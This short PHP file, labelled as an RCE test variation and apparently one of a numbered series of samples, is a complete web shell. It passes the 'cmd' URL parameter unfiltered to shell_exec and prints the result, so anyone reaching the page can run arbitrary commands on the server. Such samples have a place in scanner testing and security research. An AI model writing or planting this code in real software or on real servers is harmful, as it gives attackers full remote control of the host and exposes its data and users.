<?php
// RCE test variation #1339
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>